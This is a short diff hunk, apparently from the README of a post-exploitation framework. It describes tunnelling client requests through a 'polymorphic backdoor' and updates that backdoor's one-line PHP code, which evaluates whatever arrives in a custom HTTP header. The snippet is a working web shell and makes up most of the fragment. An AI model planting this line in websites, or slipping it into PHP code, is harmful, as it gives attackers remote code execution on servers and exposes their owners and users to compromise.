@@ -15,7 +15,7 @@ standard client requests and web server's relative responses, tunneled
 through a tiny **polymorphic backdoor**:
 
 ```php
-<? @eval($_SERVER['HTTP_PHPSPL01T']) ?>
+<?php @eval($_SERVER['HTTP_PHPSPL01T']) ?>
 ```
 
 ---------------------------------------------------------------------
